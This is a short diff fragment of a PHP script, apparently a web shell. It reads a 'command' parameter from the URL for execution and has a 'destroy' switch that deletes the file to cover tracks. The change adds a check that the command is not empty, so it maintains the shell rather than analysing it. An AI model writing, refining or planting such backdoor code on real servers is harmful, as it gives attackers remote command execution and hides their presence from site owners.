@@ -103,7 +103,7 @@
 
     if (isset($_GET['destroy'])) { unlink(__FILE__); }
 
-    if (isset($_GET['command'])) {
+    if (isset($_GET['command']) and !empty($_GET['command'])) {
 
         $output = "";
 
